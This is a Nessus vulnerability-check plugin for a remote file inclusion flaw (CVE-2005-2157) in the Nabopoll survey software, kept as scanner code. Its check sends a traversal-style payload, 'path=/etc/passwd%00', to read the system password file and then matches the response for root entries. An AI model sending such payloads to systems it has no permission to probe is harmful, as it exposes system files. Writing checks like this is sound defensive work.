#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(18618);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2005-2157");
  script_bugtraq_id(14134);
  script_osvdb_id(17706);

  script_name(english:"Nabopoll survey.inc.php path Parameter Remote File Inclusion");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
remote file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running nabopoll, a web-based voting / survey
software for PHP and MySQL. 

The installed version of nabopoll allows remote attackers to control
the 'path' parameter used when including PHP code in the script
'survey.inc.php'.  By leveraging this flaw, an attacker is able to
view arbitrary files on the remote host and even execute arbitrary PHP
code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://securitytracker.com/alerts/2005/Jul/1014355.html" );
 script_set_attribute(attribute:"solution", value:
"Ensure that PHP's 'register_globals' and 'allow_url_fopen' are
disabled." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/07/05");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/07/01");
 script_cvs_date("$Date: 2011/03/14 21:48:08 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

  script_summary(english:"Checks for path parameter remote file include vulnerability in Nabopoll");
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit one of the flaws to read /etc/passwd.
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/survey.inc.php?",
      "path=/etc/passwd%00"
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing 
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning: main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning: Failed opening '/etc/passwd.+for inclusion")
  ) {
    security_warning(port);
    exit(0);
  }
}
